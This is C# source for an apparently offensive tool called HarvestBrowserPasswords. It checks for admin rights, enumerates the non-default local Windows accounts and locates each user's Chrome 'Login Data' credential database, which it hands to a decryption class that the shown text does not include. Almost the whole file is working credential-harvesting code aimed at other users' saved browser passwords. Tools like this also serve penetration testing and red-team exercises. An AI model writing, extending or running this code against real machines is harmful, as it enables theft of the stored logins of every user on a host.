using System;
using System.Collections.Generic;
using System.Linq;
using System.Management;
using System.Security.Principal;
using System.Text;
using System.IO;

namespace HarvestBrowserPasswords
{
    class Program
    {
        static void Main(string[] args)
        {
            List<string> userAccountsCheck = new List<string>();
            List<string> databaseFilePaths = new List<string>();

            //Check if tool is running with Administrator privileges
            if (IsAdministrator())
            {
                Console.WriteLine("[+] Running as Administrator :)");
            }
            else
            {
                Console.WriteLine("[-] Not Running as Administrator...");
            }

           Console.WriteLine("[*] Listing Interesting Local Accounts...");

            //Get Usernames of all local accounts

            foreach (ManagementObject userAccount in GetLocalMachineUsers())
            {
                string userAccountName = userAccount["Name"].ToString();
                if (!CheckDefaultUsers(userAccountName))
                {
                    Console.WriteLine("[+] Found User: {0}", userAccountName);
                    userAccountsCheck.Add(userAccountName);
                }

            }

            Console.WriteLine("\n[*] Finding Google Chrome Profiles...");

            //Locate SQLite database files containing users' Chrome Credentials and connect to database
            foreach (string userAccount in userAccountsCheck)
            {
                DecryptChromeDatabase(userAccount);
            }

            Console.Write("Press any Key to Quit:\n$>");
            Console.ReadLine();

        }

        public static bool IsAdministrator()
        {
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        // Get local users on the machine
        public static List<Object> GetLocalMachineUsers()
        {
            List<Object> userAccounts = new List<Object>();
            SelectQuery query = new SelectQuery("Win32_UserAccount");
            ManagementObjectSearcher searcher = new ManagementObjectSearcher(query);
            foreach (ManagementObject mgObject in searcher.Get())
            {
                try
                {
                    //Console.WriteLine("Username : {0}", envVar["Name"]);
                    userAccounts.Add(mgObject);
                }
                catch (Exception e)
                {
                    Console.WriteLine("Exception: {0}", e);
                }
            }
            return userAccounts;
        }

        public static bool CheckDefaultUsers(string userAccountName)
        {
            List<string> defaultUserAccounts = new List<string> { "Guest", "HelpAssistant", "HomeGroupUser$", "DefaultAccount", "WDAGUtilityAccount" };
            if (defaultUserAccounts.Contains(userAccountName))
            {
                return true;
            }
            else
            {
                return false;
            }
        }

        public static void DecryptChromeDatabase(string userAccountName)
        {
            string loginDataFile = $"C:\\Users\\{userAccountName}\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
            if (File.Exists(loginDataFile))
            {
                Console.WriteLine($"[+] Found Chrome credential database for user: {userAccountName}");
                ChromeDatabaseConnection conn = new ChromeDatabaseConnection(loginDataFile);
            }

        }


    }  
}
